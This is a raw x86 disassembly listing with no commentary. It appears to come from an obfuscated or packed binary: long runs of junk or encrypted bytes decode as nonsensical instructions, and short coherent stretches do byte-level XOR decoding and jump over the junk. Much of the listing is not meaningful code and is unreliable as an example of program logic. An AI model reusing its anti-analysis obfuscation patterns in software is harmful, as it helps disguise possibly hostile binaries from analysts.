  40298f:	or     BYTE PTR ds:[esi-0x9],cl
  402993:	adc    ebp,DWORD PTR [edi+0xd]
  402996:	in     al,dx
  402997:	xchg   ebx,eax
  402998:	js     0x4029c1
  40299a:	loopne 0x4029dc
  40299c:	mov    edx,0x95dba030
  4029a1:	and    esp,DWORD PTR [ecx*2-0x1fb71b24]
  4029a8:	popa   
  4029a9:	mov    ebp,DWORD PTR [eax]
  4029ab:	ret    
  4029ac:	out    0xfc,al
  4029ae:	mov    ecx,0x2d0f1295
  4029b3:	mov    edi,0x566ff66d
  4029b8:	mov    cs,WORD PTR [ebp-0x4de687ab]
  4029be:	mov    cl,BYTE PTR [ebx+0x4a78c47d]
  4029c4:	add    BYTE PTR [ebx],cl
  4029c6:	hlt    
  4029c7:	jp     0x402a40
  4029c9:	ror    esp,cl
  4029cb:	sbb    al,0xf0
  4029cd:	ja     0x40296a
  4029cf:	fmul   st(4),st
  4029d1:	mov    DWORD PTR [edi-0x48979ccb],esi
  4029d7:	out    dx,eax
  4029d8:	cmp    BYTE PTR [esi+0x27],dh
  4029db:	je     0x5e843cb2
  4029e1:	je     0x402a5e
  4029e3:	in     eax,0x16
  4029e5:	and    BYTE PTR [esi],dh
  4029e7:	adc    BYTE PTR [ebp+0x19b74378],bl
  4029ed:	xlat   BYTE PTR ds:[ebx]
  4029ee:	dec    eax
  4029ef:	ret    0x1ba5
  4029f2:	popa   
  4029f3:	scas   eax,DWORD PTR es:[edi]
  4029f4:	stos   DWORD PTR es:[edi],eax
  4029f5:	dec    eax
  4029f6:	and    al,0x5
  4029f8:	jbe    0x4029e5
  4029fa:	push   ebp
  4029fb:	xchg   edi,eax
  4029fc:	push   esp
  4029fd:	mov    esp,0xa92f8647
  402a02:	cdq    
  402a03:	cdq    
  402a04:	xchg   edx,eax
  402a05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a06:	popf   
  402a07:	or     esi,DWORD PTR [eax]
  402a09:	cli    
  402a0a:	hlt    
  402a0b:	xchg   edx,eax
  402a0c:	ret    
  402a0d:	cs stc 
  402a0f:	rcl    BYTE PTR [edx+edx*1+0x1b],0x8b
  402a14:	inc    ebp
  402a15:	aam    0xf
  402a17:	test   DWORD PTR [ebx],eax
  402a19:	add    BYTE PTR [eax],al
  402a1b:	add    BYTE PTR [ebx-0x39cc0fbb],cl
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	mov    esi,0xaaeaeccd
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	js     0x402a14
  402a42:	(bad)  
  402a43:	daa    
  402a44:	inc    ebx
  402a45:	ja     0x402a2d
  402a47:	ds adc al,0xfb
  402a4a:	cmp    cl,BYTE PTR [edx-0x22]
  402a4d:	das    
  402a4e:	mov    DWORD PTR [edi-0x172794ae],esp
  402a54:	popa   
  402a55:	jl     0x402acf
  402a57:	mov    cl,0x13
  402a59:	(bad)
  402a5e:	stos   BYTE PTR es:[edi],al
  402a5f:	push   ss
  402a60:	sbb    al,0x85
  402a62:	test   BYTE PTR [ebx-0x4b],dh
  402a65:	jecxz  0x402a1a
  402a67:	mov    esi,0x1dab02d6
  402a6c:	xchg   DWORD PTR [esi+0x15],ebp
  402a6f:	pushf  
  402a70:	jg     0x4029f4
  402a72:	sub    esi,eax
  402a74:	add    dh,ah
  402a76:	fcomp  QWORD PTR ds:[ebp+0x2b237815]
  402a7d:	mov    cl,0x42
  402a7f:	pop    ss
  402a80:	xor    eax,0x285e9a27
  402a85:	xchg   BYTE PTR [edx-0x553c93c5],cl
  402a8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a8c:	shl    DWORD PTR [ebp+0x6],0xba
  402a90:	push   DWORD PTR ds:0x4d1fd126
  402a96:	enter  0xa9df,0x6c
  402a9a:	aam    0xd0
  402a9c:	dec    ebx
  402a9d:	(bad)  
  402a9e:	rcl    BYTE PTR ds:[edx],0xc2
  402aa2:	jmp    0xe289:0x18717f1c
  402aa9:	mov    WORD PTR [eax+0x59],fs
  402aac:	retf   
  402aad:	jle    0x402a7a
  402aaf:	test   BYTE PTR [ecx],al
  402ab1:	outs   dx,DWORD PTR ds:[esi]
  402ab2:	xor    ecx,DWORD PTR ds:0x32b6d5dc
  402ab8:	(bad)  
  402ab9:	popf   
  402aba:	adc    BYTE PTR [ebp-0x35],0xcc
  402abe:	pop    esi
  402abf:	daa    
  402ac0:	mov    al,0x84
  402ac2:	inc    edx
  402ac3:	sbb    al,0xd0
  402ac5:	or     al,BYTE PTR [eax+esi*2+0x62]
  402ac9:	in     al,dx
  402aca:	push   ecx
  402acb:	dec    edi
  402acc:	ds in  al,0xff
  402acf:	lock jbe 0x402ad5
  402ad2:	fimul  DWORD PTR [ebp+0x67]
  402ad5:	pop    edi
  402ad6:	jae    0x402ac1
  402ad8:	sti    
  402ad9:	out    dx,al
  402ada:	sar    BYTE PTR [edi],1
  402adc:	jo     0x402a80
  402ade:	dec    esi
  402adf:	xchg   ebx,eax
  402ae0:	sbb    eax,0x75da06b4
  402ae5:	sbb    eax,0x4fd37420
  402aea:	cmp    al,0xf
  402aec:	leave  
  402aed:	mov    ch,ch
  402aef:	cwde   
  402af0:	push   edi
  402af1:	dec    eax
  402af2:	mov    ds:0x57cafcee,al
  402af7:	cmp    esp,DWORD PTR [eax+0x3921f261]
  402afd:	sub    al,BYTE PTR [ebp+esi*1+0x2f22f5a7]
  402b04:	jmp    0x94d44b07
  402b09:	sbb    al,0x65
  402b0b:	int    0xd4
  402b0d:	dec    ecx
  402b0e:	xchg   esp,eax
  402b0f:	dec    edi
  402b10:	pop    esi
  402b11:	and    DWORD PTR [esi+edi*4],edx
  402b14:	adc    esp,DWORD PTR [ebx-0xb16bd]
  402b1a:	mov    esp,0xd578629f
  402b1f:	lahf   
  402b20:	xchg   edi,eax
  402b21:	mov    bh,0x49
  402b23:	call   0xc83dd64c
  402b28:	xchg   edi,eax
  402b29:	in     eax,dx
  402b2a:	mov    esi,DWORD PTR [ebx-0x3c74bd44]
  402b30:	in     al,dx
  402b31:	mov    eax,DWORD PTR [ebp+0x3a]
  402b34:	call   0xd41d:0x944dea76
  402b3b:	add    eax,0x26d840d6
  402b40:	xor    esp,edi
  402b42:	or     ebx,DWORD PTR ds:[edx-0x30]
  402b46:	out    0x9d,eax
  402b48:	add    eax,0x34768d8a
  402b4d:	push   0x29f5867
  402b52:	xlat   BYTE PTR ds:[ebx]
  402b53:	xchg   BYTE PTR [ecx],ch
  402b55:	and    al,0x6b
  402b57:	fwait
  402b58:	cli    
  402b59:	fldenv [ebp+0x5d]
  402b5c:	cmc    
  402b5d:	inc    edx
  402b5e:	rcl    al,1
  402b60:	rol    DWORD PTR [edi],0x79
  402b63:	inc    ebp
  402b64:	lahf   
  402b65:	push   edi
  402b66:	dec    ebx
  402b67:	jle    0x402b70
  402b69:	cmp    BYTE PTR [ecx+0x16aad0db],bl
  402b6f:	out    0x53,eax
  402b71:	out    dx,eax
  402b72:	ds jecxz 0x402bc8
  402b75:	push   esi
  402b76:	xchg   ecx,eax
  402b77:	aas    
  402b78:	test   al,0x8b
  402b7a:	xlat   BYTE PTR ds:[ebx]
  402b7b:	outs   dx,DWORD PTR ds:[esi]
  402b7c:	es jae 0x402ba7
  402b7f:	dec    ebp
  402b80:	mov    DWORD PTR [ebx+edi*1+0x38160d95],ebx
  402b87:	adc    ebp,ebx
  402b89:	test   dh,0x9f
  402b8c:	loopne 0x402b9f
  402b8e:	pop    esi
  402b8f:	mov    ds:0xbea96006,eax
  402b94:	hlt    
  402b95:	add    eax,0x94153b6b
  402b9a:	xlat   BYTE PTR ds:[ebx]
  402b9b:	das    
  402b9c:	or     dh,BYTE PTR [ebx-0x3d]
  402b9f:	push   ebp
  402ba0:	loop   0x402b41
  402ba2:	stos   DWORD PTR es:[edi],eax
  402ba3:	cmp    BYTE PTR [ebx],bh
  402ba5:	int    0xab
  402ba7:	jmp    0x642a7899
  402bac:	pop    ebx
  402bad:	cmp    DWORD PTR [esi+esi*1],0x5c2ecf65
  402bb4:	out    0xa0,eax
  402bb6:	sub    ch,BYTE PTR [ebx-0x77efe953]
  402bbc:	das    
  402bbd:	cmp    eax,0x5e9b1d6
  402bc2:	cs out dx,al
  402bc4:	test   eax,eax
  402bc6:	je     0x402bf4
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	push   es
  402c12:	in     eax,0x52
  402c14:	mov    dl,0x36
  402c16:	or     edi,DWORD PTR [esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402bce
  402c1e:	in     eax,dx
  402c1f:	cs adc eax,0x7c30d86d
  402c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c26:	jbe    0x402c47
  402c28:	test   ah,dl
  402c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c2b:	adc    ebx,DWORD PTR [esi+edi*1-0x44]
  402c2f:	in     al,dx
  402c30:	ins    BYTE PTR es:[edi],dx
  402c31:	and    DWORD PTR [ebp-0x6d1fe50c],ecx
  402c37:	pop    ebx
  402c38:	fs repz int3 
  402c3b:	std    
  402c3c:	push   cs
  402c3d:	xor    al,0xcf
  402c3f:	inc    ecx
  402c40:	je     0x402c3f
  402c42:	imul   ebx,DWORD PTR [edi+0x12e309f5],0xffffffde
  402c49:	(bad)  
  402c4a:	loop   0x402cac
  402c4c:	mov    dl,BYTE PTR [ebp+0x4279d2de]
  402c52:	adc    al,0xed
  402c54:	pop    ecx
  402c55:	popa   
  402c56:	cmp    DWORD PTR [ecx-0x4],edi
  402c59:	inc    edx
  402c5a:	repnz es push cs
  402c5d:	jnp    0x402c06
  402c5f:	into   
  402c60:	cmp    eax,0x7f1439ca
  402c65:	or     al,0x39
  402c67:	sti    
  402c68:	push   0x12
  402c6a:	adc    BYTE PTR [esi+0x40],ah
  402c6d:	popa   
  402c6e:	call   0xac95:0x755dc642
  402c75:	sbb    BYTE PTR [edx+0x34d3f0c],al
  402c7b:	scas   eax,DWORD PTR es:[edi]
  402c7c:	rol    DWORD PTR [edi],cl
  402c7e:	bound  ebx,QWORD PTR [ebx]
  402c80:	xchg   DWORD PTR [ecx],esi
  402c82:	inc    eax
  402c83:	(bad)  
  402c85:	jg     0x402cfe
  402c87:	push   ds
  402c88:	or     ch,BYTE PTR [edi-0x2263f70f]
  402c8e:	inc    esp
  402c8f:	bound  edi,QWORD PTR [edx-0x72]
  402c92:	pop    esi
  402c93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c94:	xchg   BYTE PTR [ecx+0x75],ch
  402c97:	or     esp,edx
  402c99:	cmp    edx,eax
  402c9b:	repnz xor BYTE PTR [esi],al
  402c9e:	lods   eax,DWORD PTR ds:[esi]
  402c9f:	pop    edi
  402ca0:	sub    esi,DWORD PTR [ecx+0x38021c3c]
  402ca6:	pop    ecx
  402ca7:	adc    dh,0xf4
  402caa:	js     0x402cde
  402cac:	enter  0xd1ca,0xcb
  402cb0:	fldz   
  402cb2:	jge    0x402c37
  402cb4:	ins    DWORD PTR es:[edi],dx
  402cb5:	mov    ebp,0x125b8261
  402cba:	push   ss
  402cbb:	mov    ah,0xea
  402cbd:	push   esi
  402cbe:	or     cl,BYTE PTR [edx+0x3089dfeb]
  402cc4:	(bad)  
  402cc5:	mov    edi,0xe3ae3a6f
  402cca:	dec    esi
  402ccb:	sub    ebp,DWORD PTR [edi]
  402ccd:	fxch   st(1)
  402ccf:	out    dx,ax
  402cd1:	imul   esp,DWORD PTR [edx+0x5d],0xf5517a28
  402cd8:	pop    edi
  402cd9:	push   edi
  402cda:	mov    esp,0xa32cfa4b
  402cdf:	cmp    eax,0xbcce8f71
  402ce4:	neg    DWORD PTR [ebx-0x2]
  402ce7:	push   ds
  402ce8:	gs out dx,eax
  402cea:	rcl    BYTE PTR [esi+0x2d857f41],1
  402cf0:	shr    cl,1
  402cf2:	or     BYTE PTR [ecx],ah
  402cf4:	(bad)  
  402cf5:	pop    edi
  402cf6:	stos   BYTE PTR es:[edi],al
  402cf7:	sbb    eax,0x44bcf096
  402cfc:	setb   BYTE PTR [edx+0x6513f541]
  402d03:	repnz shl DWORD PTR [edi],cl
  402d06:	(bad)  
  402d07:	jns    0x402ce5
  402d09:	aaa    
  402d0a:	fcomp  QWORD PTR [eax+0x71]
  402d0d:	mov    bl,0x11
  402d0f:	call   0x7a1df3c3
  402d14:	fild   QWORD PTR [ebp+0x349b5f08]
  402d1a:	jl     0x402d0a
  402d1c:	xchg   ebp,eax
  402d1d:	je     0x402d6e
  402d1f:	sbb    eax,0x2b0f436e
  402d24:	mov    ds:0x4d16a91c,eax
  402d29:	sub    cl,dh
  402d2b:	mov    eax,ds:0x946a57
  402d30:	sub    al,0x20
  402d32:	jb     0x402ce9
  402d34:	jns    0x402cf0
  402d36:	push   ebx
  402d37:	aas    
  402d38:	sub    eax,0xcc9e265a
  402d3d:	aad    0x91
  402d3f:	and    eax,0x4e16366e
  402d44:	bound  edx,QWORD PTR [ebx+0x1a]
  402d47:	lds    esi,FWORD PTR [ecx+0x2]
  402d4a:	push   edi
  402d4b:	or     BYTE PTR [ebx-0x26],ah
  402d4e:	jmp    0x402d8b
  402d50:	xchg   esp,eax
  402d51:	ja     0x402d40
  402d53:	sbb    cl,BYTE PTR [eax+ebp*2-0x59]
  402d57:	stc    
  402d58:	iret   
  402d59:	jp     0x402db3
  402d5b:	xchg   edx,eax
  402d5c:	ret    0xb4a6
  402d5f:	not    BYTE PTR [esi+0x6d]
  402d62:	mov    ebx,0x32f985a1
  402d67:	pop    ds
  402d68:	ins    BYTE PTR es:[edi],dx
  402d69:	loope  0x402d08
  402d6b:	mov    BYTE PTR [edi-0x3d62a90f],dl
  402d71:	add    dh,BYTE PTR [ecx]
  402d73:	pop    ebp
  402d74:	and    BYTE PTR [ebx],0xef
  402d77:	xor    al,0xf4
  402d79:	cli    
  402d7a:	call   DWORD PTR [edx+0x36]
  402d7d:	push   ecx
  402d7e:	sar    DWORD PTR [edi+0x55],cl
  402d81:	test   BYTE PTR [edi-0x3a7e70ce],0x4c
  402d88:	enter  0x3763,0x7c
  402d8c:	push   ebx
  402d8d:	jmp    0xee5a:0x906bd3a
  402d94:	push   ebp
  402d95:	outs   dx,BYTE PTR ds:[esi]
  402d96:	adc    DWORD PTR [edx],edi
  402d98:	cli    
  402d99:	int3   
  402d9a:	dec    edi
  402d9b:	sbb    BYTE PTR [ebp-0x58],0xf7
  402d9f:	dec    ecx
  402da0:	xor    al,0x2b
  402da2:	inc    ebp
  402da3:	cld    
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ebp+ecx*1+0x7a],1
  402de7:	and    al,0x10
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e36
  402df2:	sbb    al,0x97
  402df4:	mov    ah,0xd4
  402df6:	lahf   
  402df7:	pop    ebp
  402df8:	xor    bl,BYTE PTR [edi]
  402dfa:	xor    eax,0x556616f9
  402dff:	sbb    DWORD PTR [ecx+0xdcca709],ebp
  402e05:	xchg   esi,eax
  402e06:	iret   
  402e07:	ss and eax,0xa4f35f87
  402e0d:	xor    BYTE PTR [eax],dh
  402e0f:	inc    eax
  402e10:	into   
  402e11:	mov    al,0x7e
  402e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e14:	and    bl,BYTE PTR [ecx+0x44]
  402e17:	(bad)
  402e1a:	push   0x1c66653b
  402e1f:	inc    si
  402e21:	lahf   
  402e22:	pop    ds
  402e23:	jg     0x402e8c
  402e25:	jmp    0x402e99
  402e27:	sahf   
  402e28:	push   cs
  402e29:	mov    ah,0xf1
  402e2b:	inc    ebx
  402e2c:	shl    ebx,1
  402e2e:	repz mov edi,0xafcc7786
  402e34:	mov    al,0xea
  402e36:	jnp    0x402db8
  402e38:	(bad)  [ebp-0x830f8dc]
  402e3e:	lock pop edx
  402e40:	call   0xfa58832
  402e45:	sbb    esp,edi
  402e47:	ret    
  402e48:	out    0xa7,al
  402e4a:	sbb    BYTE PTR [eax-0x39f27b28],ch
  402e50:	lahf   
  402e51:	test   eax,0x5b68465d
  402e56:	xchg   edi,eax
  402e57:	jmp    0x402dfd
  402e59:	loop   0x402e71
  402e5b:	or     DWORD PTR [esi-0x3],ebx
  402e5e:	mov    al,0xa9
  402e60:	and    BYTE PTR [edx+0xebd0f10],dh
  402e66:	repnz fstp st(1)
  402e69:	push   esi
  402e6a:	dec    edi
  402e6b:	sub    al,0x35
  402e6d:	lock xlat BYTE PTR ds:[ebx]
  402e6f:	jbe    0x402ebe
  402e71:	loopne 0x402e0e
  402e73:	cdq    
  402e74:	(bad)  
  402e75:	imul   edi,esp,0x2af20cfe
  402e7b:	outs   dx,BYTE PTR ds:[esi]
  402e7c:	out    dx,eax
  402e7d:	lods   eax,DWORD PTR ds:[esi]
  402e7e:	cmp    ebx,ebp
  402e80:	ins    DWORD PTR es:[edi],dx
  402e81:	in     al,dx
  402e82:	jp     0x402e45
  402e84:	out    0xc0,al
  402e86:	or     al,0x74
  402e88:	out    dx,al
  402e89:	push   0x7a37592
  402e8e:	add    eax,0xc52735dc
  402e93:	test   DWORD PTR [ebx+0x509365ea],eax
  402e99:	xor    eax,0xe1006182
  402e9e:	adc    eax,0xb083cb65
  402ea3:	lea    ebp,[ecx-0x7fc144fa]
  402ea9:	loopne 0x402f20
  402eab:	push   es
  402eac:	sbb    DWORD PTR [edi+eiz*1-0x6f],esi
  402eb0:	dec    esi
  402eb1:	jne    0x402f03
  402eb3:	push   ebx
  402eb4:	bound  eax,QWORD PTR [ecx+0x6c]
  402eb7:	mov    ebp,DWORD PTR [ebx+0x5a074bf7]
  402ebd:	mov    esp,0x8076573e
  402ec2:	sbb    al,0xb1
  402ec4:	sbb    esp,DWORD PTR [ebp+eiz*8+0x63]
  402ec8:	mov    edi,0xf160528f
  402ecd:	test   al,0xd8
  402ecf:	mov    cl,0x0
  402ed1:	aaa    
  402ed2:	loope  0x402f0b
  402ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ed5:	sbb    al,0x9a
  402ed7:	stc    
  402ed8:	or     DWORD PTR [eax],0xe7d05ae9
  402ede:	pop    esp
  402edf:	mov    ds:0x8c757c29,eax
  402ee4:	xor    al,0x80
  402ee6:	jge    0x402ecd
  402ee8:	cmp    BYTE PTR [ecx],0x84
  402eeb:	sar    cl,0x25
  402eee:	jl     0x402f03
  402ef0:	scas   eax,DWORD PTR es:[edi]
  402ef1:	pop    edi
  402ef2:	int    0xdc
  402ef4:	sub    ebx,DWORD PTR [edx-0x65]
  402ef7:	mov    al,0x12
  402ef9:	and    edx,DWORD PTR [eax]
  402efb:	xor    eax,DWORD PTR ds:0x7ab72f62
  402f01:	js     0x402eaf
  402f03:	jg     0x402e9a
  402f05:	aaa    
  402f06:	loope  0x402ecf
  402f08:	imul   eax,DWORD PTR [edx+0x6c],0xffffffee
  402f0c:	popf   
  402f0d:	cwde   
  402f0e:	dec    edi
  402f0f:	mov    ebp,0x847fa66e
  402f14:	popf   
  402f15:	fimul  DWORD PTR [ebp+0x385c52b5]
  402f1b:	mov    cs,edx
  402f1d:	test   al,0xd5
  402f1f:	outs   dx,DWORD PTR ds:[esi]
  402f20:	mov    ah,0x91
  402f22:	mov    edi,DWORD PTR [edi-0x618e0929]
  402f28:	sti    
  402f29:	mov    ecx,DWORD PTR [edx-0x51]
  402f2c:	xor    BYTE PTR [ebp-0x27],dl
  402f2f:	sbb    BYTE PTR [eax+0x1f8cd94b],al
  402f35:	retf   
  402f36:	gs xor al,0xfa
  402f39:	icebp  
  402f3a:	loope  0x402f46
  402f3c:	scas   eax,DWORD PTR es:[edi]
  402f3d:	addr16 xor eax,0xac3208b9
  402f43:	retf   
  402f44:	sub    edi,DWORD PTR [edi+0x4af306d7]
  402f4a:	or     bh,BYTE PTR [eax]
  402f4c:	aad    0x79
  402f4e:	scas   al,BYTE PTR es:[edi]
  402f4f:	inc    ebx
  402f50:	push   ebx
  402f51:	add    DWORD PTR [ecx+0x7e73ec7c],eax
  402f57:	cmp    BYTE PTR [ecx+eax*1+0x9],0x58
  402f5c:	or     edx,0x34a084bf
  402f62:	add    ebx,ebp
  402f64:	in     eax,0x61
  402f66:	xor    esp,edx
  402f68:	pop    ds
  402f69:	jmp    0x52273aba
  402f6e:	sahf   
  402f6f:	loop   0x402ef3
  402f71:	loope  0x402f6c
  402f73:	rol    DWORD PTR [eax],1
  402f75:	lea    eax,ds:0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x46fd5a49]
  402fae:	inc    ebx
  402faf:	or     bh,BYTE PTR [esi]
  402fb1:	push   ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402fcb
  402fb9:	test   eax,0x10c7a9c6
  402fbe:	or     al,0xe8
  402fc0:	sub    eax,0x2822e45b
  402fc5:	sbb    al,0x8c
  402fc7:	lods   eax,DWORD PTR ds:[esi]
  402fc8:	dec    esi
  402fc9:	sub    bh,BYTE PTR [esp+eiz*8]
  402fcc:	cdq    
  402fcd:	inc    DWORD PTR [eax-0x48]
  402fd0:	mov    ah,0x4
  402fd2:	push   ds
  402fd3:	jg     0x402fd2
  402fd5:	cmp    BYTE PTR es:[ebx-0x17],bh
  402fd9:	(bad)  
  402fdb:	mov    esi,0xe977713d
  402fe0:	adc    esp,DWORD PTR [eax+esi*2-0x79]
  402fe4:	push   0xd84a0ba5
  402fe9:	or     bh,BYTE PTR [ebp+ecx*1-0x74]
  402fed:	and    bh,BYTE PTR [eax]
  402fef:	mov    ah,0x3d
  402ff1:	cmp    al,0x5c
  402ff3:	fsubr  DWORD PTR [eax]
  402ff5:	push   edi
  402ff6:	fild   WORD PTR [ebx-0x32]
  402ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ffa:	scas   al,BYTE PTR es:[edi]
  402ffb:	rol    DWORD PTR [ebp+0x78],0x7b
  402fff:	sbb    BYTE PTR [eax],dh
  403001:	mov    ebx,0xa3f4b919
  403006:	push   cs
  403007:	stos   DWORD PTR es:[edi],eax
  403008:	sbb    al,0x43
  40300a:	test   eax,0x1644beb4
  40300f:	mov    WORD PTR [ecx],fs
  403011:	stc    
  403012:	or     edi,edi
  403014:	dec    esi
  403015:	push   ebx
  403016:	mov    al,0x63
  403018:	add    eax,0x3d8777cb
  40301d:	push   esp
  40301e:	loopne 0x402fc3
  403020:	mov    ebp,es
  403022:	imul   ebx,DWORD PTR [edx-0x4ce70b87],0xffffff80
  403029:	adc    dh,BYTE PTR ds:0xd37a842c
  40302f:	jo     0x402ffd
  403031:	call   0xb31f:0x661d0791
  403038:	jg     0x40300f
  40303a:	pop    ebx
  40303b:	dec    DWORD PTR [edi-0x13ff3da8]
  403041:	push   ecx
  403042:	mul    BYTE PTR [eax+0x10]
  403045:	sub    edi,DWORD PTR ds:0x22bfcbb7
  40304b:	aas    
  40304c:	pop    edx
  40304d:	inc    ecx
  40304e:	sbb    bh,al
  403050:	loopne 0x402ff9
  403052:	jo     0x40308c
  403054:	inc    edx
  403055:	addr16 addr16 sub eax,0x38cacece
  40305c:	adc    BYTE PTR ds:0x59c33d7e,dl
  403062:	and    eax,0x8b113b7f
  403067:	jne    0x403092
  403069:	jmp    0x40306f
  40306b:	into   
  40306c:	push   ebx
  40306d:	(bad)  
  40306e:	cmp    ebp,DWORD PTR [eax+0x58]
  403071:	lea    ebx,[edi-0xd]
  403074:	sbb    DWORD PTR ds:0xb07dc182,esi
  40307a:	jb     0x403082
  40307c:	ror    DWORD PTR [esi+0x6c],cl
  40307f:	pop    ebp
  403080:	je     0x4030b6
  403082:	test   esi,esi
  403084:	sbb    BYTE PTR [edx-0x38ab6496],ah
  40308a:	stos   BYTE PTR es:[edi],al
  40308b:	xchg   ebx,eax
  40308c:	add    ebx,DWORD PTR [ebp+0x1989fa99]
  403092:	fidivr DWORD PTR [edx+0x45]
  403095:	rcl    BYTE PTR [eax+0x1a],1
  403098:	pop    edx
  403099:	lods   eax,DWORD PTR ds:[esi]
  40309a:	xchg   ebp,eax
  40309b:	dec    ecx
  40309c:	pop    es
  40309d:	out    0xa5,eax
  40309f:	jecxz  0x40310f
  4030a1:	pop    ss
  4030a2:	cmp    eax,0x44e9f3be
  4030a7:	aad    0xa
  4030a9:	dec    edx
  4030aa:	and    ah,BYTE PTR [edx-0x1cf92253]
  4030b0:	fsubr  QWORD PTR [edi-0x12]
  4030b3:	jno    0x40310a
  4030b5:	mov    WORD PTR [esi-0x17],gs
  4030b8:	sahf   
  4030b9:	xor    eax,0xa9c98205
  4030be:	cmc    
  4030bf:	mov    ds:0x6832db57,eax
  4030c4:	mov    dl,0x38
  4030c6:	ror    DWORD PTR [eax],0xf6
  4030c9:	jmp    0x4030f0
  4030cb:	scas   al,BYTE PTR es:[edi]
  4030cc:	and    ebp,DWORD PTR [esi+0x2edd146a]
  4030d2:	xor    DWORD PTR [ebx],esp
  4030d4:	sub    al,0xc0
  4030d6:	sbb    ch,cl
  4030d8:	mov    BYTE PTR [ebx+0x36025ec5],ch
  4030de:	jle    0x40314e
  4030e0:	arpl   ax,bx
  4030e2:	inc    edi
  4030e3:	leave  
  4030e4:	push   ebx
  4030e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030e6:	orps   xmm4,xmm0
  4030e9:	out    0x45,al
  4030eb:	outs   dx,BYTE PTR ds:[esi]
  4030ec:	sbb    DWORD PTR [ecx],edi
  4030ee:	mov    ch,0x67
  4030f0:	(bad)  
  4030f1:	mov    esp,0x6fec20ae
  4030f6:	mov    eax,ds:0x7b8ad46e
  4030fb:	inc    ecx
  4030fc:	sub    ebx,DWORD PTR [ebp+0x4f9a5e7d]
  403102:	mov    edi,0x5452b99e
  403107:	shl    BYTE PTR ds:0x30a11480,cl
  40310d:	aad    0x8
  40310f:	jg     0x4030b8
  403111:	xor    bl,ch
  403113:	fnstenv [ebp+ecx*4-0x1ae29ed0]
  40311a:	mov    esi,0xb726da76
  40311f:	jo     0x4030d7
  403121:	scas   al,BYTE PTR es:[edi]
  403122:	fcmovne st,st(4)
  403124:	push   es
  403125:	dec    eax
  403126:	sar    dh,cl
  403128:	out    0x49,eax
  40312a:	fs dec ecx
  40312c:	imul   ecx,DWORD PTR [ebx+edi*4],0xd2550914
  403133:	cmp    ebx,ecx
  403135:	jecxz  0x4030ef
  403137:	jb     0x4030f4
  403139:	aad    0x15
  40313b:	(bad)  
  40313c:	call   DWORD PTR [eax-0x2]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
